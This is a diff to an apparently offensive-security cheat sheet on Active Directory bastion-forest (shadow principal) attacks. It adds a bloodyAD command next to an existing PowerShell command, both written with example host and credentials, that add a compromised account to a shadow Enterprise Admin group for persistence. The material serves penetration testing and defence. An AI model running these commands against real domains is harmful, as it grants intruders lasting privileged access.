@@ -34,10 +34,15 @@ If we compromise the bastion we get `Domain Admins` privileges on the other doma
     * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)
     * Using SID History
 * Persistence
-  ```ps1
-  # Add a compromised user to the group 
-  Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
-  ```
+    * Windows/Linux:
+    ```ps1
+    bloodyAD --host 10.1.0.4 -u john.doe -p 'Password123!' -d bloody add groupMember 'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local' Administrator
+    ```
+    * Windows only:
+    ```ps1
+    # Add a compromised user to the group 
+    Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
+    ```
 
 ## References
 
